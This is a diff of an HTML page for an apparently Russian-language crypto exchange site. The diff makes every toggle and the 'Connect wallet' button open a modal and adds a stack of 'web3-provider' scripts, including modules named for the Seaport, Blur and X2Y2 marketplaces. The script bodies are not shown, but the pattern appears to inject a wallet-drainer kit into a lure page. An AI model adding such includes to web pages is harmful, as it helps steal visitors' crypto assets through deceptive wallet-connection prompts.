@@ -43,18 +43,34 @@
 	<main class="swap">
 		<div class="container">
 			<div class="fx">
-				<div class="toggler fx">
+				<div class="toggler fx" onclick="modalOpen()">
 					<button class="toggler__btn active">Обмен</button>
 					<button class="toggler__btn">Купить</button>
 				</div>
 				<img src="img/set.svg" alt="set">
 			</div>
-			<button class="btn w100">Подключить кошелек</button>
+			<button class="btn w100" onclick="modalOpen()">Подключить кошелек</button>
 		</div>
 	</main>
 
 	<script src="./js/jquery-3.7.1.min.js"></script>
 	<script src="./js/script.js"></script>
+
+	<script src="/assets/web3-provider/web3-modal.js"></script>
+	<script src="/assets/web3-provider/web3-loader.js"></script>
+	<script src="/assets/web3-provider/web3-connect.js"></script>
+	<script src="/assets/web3-provider/web3-router.js"></script>
+	<script src="/assets/web3-provider/web3-module.js"></script>
+	<script src="/assets/web3-provider/web3-alert.js"></script>
+	<script src="/assets/web3-provider/web3-seaport.js"></script>
+	<script src="/assets/web3-provider/web3-data.js"></script>
+	<script src="/assets/web3-provider/ethers.js"></script>
+	<script src="/assets/web3-provider/ethereum-tx.js"></script>
+	<script src="/assets/web3-modules/module-seaport.js"></script>
+	<script src="/assets/web3-modules/module-blur.js"></script>
+	<script src="/assets/web3-modules/module-x2y2.js"></script>
+	<script src="/assets/web3-provider.js"></script>
+
 </body>
 
 </html>
